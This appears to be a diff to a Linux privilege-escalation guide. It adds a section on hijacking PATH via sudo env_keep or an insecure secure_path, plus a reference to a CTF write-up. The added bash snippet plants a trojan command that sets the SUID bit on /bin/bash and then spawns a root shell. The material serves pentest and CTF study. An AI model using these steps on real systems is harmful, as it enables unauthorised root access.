@@ -985,8 +985,23 @@ BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/
   - Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
   - Consider sudo I/O logging and alerting when preserved env vars are used.
 
-### Sudo execution bypassing paths
+### Sudo env_keep+=PATH / insecure secure_path → PATH hijack
 
+If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.
+
+- Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
+
+```bash
+cat > ~/bin/free <<'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x ~/bin/free
+sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
+bash -p                                # root shell via SUID bit
+```
+
+### Sudo execution bypassing paths
 **Jump** to read other files or use **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
 
 ```bash
@@ -1800,6 +1815,7 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 
 - [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
 - [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
+- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
 - [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
 - [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 - [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
